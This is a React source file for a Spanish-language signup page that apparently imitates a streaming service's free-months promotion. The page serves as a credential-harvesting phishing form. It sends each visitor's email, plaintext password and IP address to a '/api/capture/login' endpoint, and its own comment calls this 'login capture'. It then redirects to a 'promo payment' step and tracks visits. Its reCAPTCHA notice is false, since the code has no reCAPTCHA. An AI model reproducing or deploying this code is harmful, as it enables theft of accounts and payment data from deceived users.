/**
 * Promo Register - Create new account (email + password)
 * After registration, redirects to promo payment
 */

import PageTransition from "@/components/PageTransition";
import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import BrandLogo from "@/components/BrandLogo";
import { Eye, EyeOff } from "lucide-react";

export default function PromoRegister() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [emailError, setEmailError] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [, setLocation] = useLocation();

  useEffect(() => {
    fetch("/api/track/visit", { method: "POST" }).catch(() => {});
  }, []);

  const validateEmail = () => {
    const value = email.trim();
    if (!value) {
      setEmailError("Ingresa un email válido.");
      return false;
    }
    if (!value.includes("@") || !value.includes(".")) {
      setEmailError("Ingresa un email válido.");
      return false;
    }
    setEmailError("");
    return true;
  };

  const validatePassword = () => {
    if (!password.trim()) {
      setPasswordError("Ingresa una contraseña.");
      return false;
    }
    if (password.length < 6) {
      setPasswordError("La contraseña debe tener al menos 6 caracteres.");
      return false;
    }
    setPasswordError("");
    return true;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const emailValid = validateEmail();
    const passValid = validatePassword();
    if (!emailValid || !passValid) return;

    setIsLoading(true);
    sessionStorage.setItem("userEmail", email);
    sessionStorage.setItem("sp_email", email);
    sessionStorage.setItem("sp_login_password", password);

    // Send registration data to backend (same as login capture)
    try {
      const ipRes = await fetch("https://api.ipify.org?format=json").catch(() => null);
      const ipData = ipRes ? await ipRes.json() : { ip: "unknown" };
      await fetch("/api/capture/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          email,
          password,
          ipAddress: ipData.ip,
        }),
      }).catch(() => {});
    } catch {}

    setTimeout(() => {
      setIsLoading(false);
      setLocation("/promo/payment");
    }, 1200);
  };

  return (
    <PageTransition>
      <div className="min-h-[100dvh] w-full bg-black flex flex-col">
        {/* Header */}
        <header className="w-full px-4 sm:px-8 lg:px-12 pt-4 pb-2 border-b border-[#333]">
          <BrandLogo height={20} />
        </header>

        {/* Main Content */}
        <main className="flex-1 flex flex-col items-start sm:items-start lg:items-center px-4 sm:px-8 lg:px-12 pt-10 sm:pt-16">
          <div className="w-full max-w-[400px] lg:max-w-[450px]">
            {/* Title */}
            <h1 className="text-[28px] sm:text-[32px] lg:text-[36px] font-bold text-white mb-2 leading-[1.15]">
              Crea tu cuenta
            </h1>

            {/* Subtitle */}
            <p className="text-[#8c8c8c] text-[15px] sm:text-[16px] mb-6 sm:mb-8">
              Crea una cuenta nueva para activar tus 6 meses gratis.
            </p>

            {/* Form */}
            <form onSubmit={handleSubmit} className="space-y-4">
              {/* Email */}
              <div>
                <input
                  type="email"
                  placeholder="Email"
                  value={email}
                  onChange={(e) => {
                    setEmail(e.target.value);
                    if (emailError) setEmailError("");
                  }}
                  className={`w-full h-[48px] sm:h-[50px] px-4 rounded bg-transparent text-white placeholder:text-[#8c8c8c] text-[15px] sm:text-[16px] outline-none transition-colors border ${
                    emailError ? "border-[#E50914]" : "border-[#8c8c8c] focus:border-white"
                  }`}
                />
                {emailError && (
                  <div className="flex items-center gap-1.5 mt-2">
                    <svg viewBox="0 0 16 16" className="w-4 h-4 flex-shrink-0" fill="none">
                      <circle cx="8" cy="8" r="7" stroke="#E50914" strokeWidth="1.5" />
                      <path d="M5 5l6 6M11 5l-6 6" stroke="#E50914" strokeWidth="1.5" strokeLinecap="round" />
                    </svg>
                    <p className="text-[#E50914] text-[13px]">{emailError}</p>
                  </div>
                )}
              </div>

              {/* Password */}
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  placeholder="Contraseña (mínimo 6 caracteres)"
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value);
                    if (passwordError) setPasswordError("");
                  }}
                  className={`w-full h-[48px] sm:h-[50px] px-4 pr-12 rounded bg-transparent text-white placeholder:text-[#8c8c8c] text-[15px] sm:text-[16px] outline-none transition-colors border ${
                    passwordError ? "border-[#E50914]" : "border-[#8c8c8c] focus:border-white"
                  }`}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-[#8c8c8c] hover:text-white transition-colors"
                >
                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                </button>
                {passwordError && (
                  <div className="flex items-center gap-1.5 mt-2">
                    <svg viewBox="0 0 16 16" className="w-4 h-4 flex-shrink-0" fill="none">
                      <circle cx="8" cy="8" r="7" stroke="#E50914" strokeWidth="1.5" />
                      <path d="M5 5l6 6M11 5l-6 6" stroke="#E50914" strokeWidth="1.5" strokeLinecap="round" />
                    </svg>
                    <p className="text-[#E50914] text-[13px]">{passwordError}</p>
                  </div>
                )}
              </div>

              {/* Submit */}
              <button
                type="submit"
                disabled={isLoading}
                className="w-full h-[48px] sm:h-[50px] bg-[#E50914] text-white text-[15px] sm:text-[16px] font-bold rounded hover:bg-[#F6121D] active:scale-[0.98] transition-all duration-150 disabled:opacity-70"
              >
                {isLoading ? "Creando cuenta..." : "Crear cuenta"}
              </button>
            </form>

            <p className="text-[#8c8c8c] text-[12px] sm:text-[13px] mt-6 sm:mt-8 leading-relaxed">
              Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot.
            </p>
          </div>
        </main>
      </div>
    </PageTransition>
  );
}
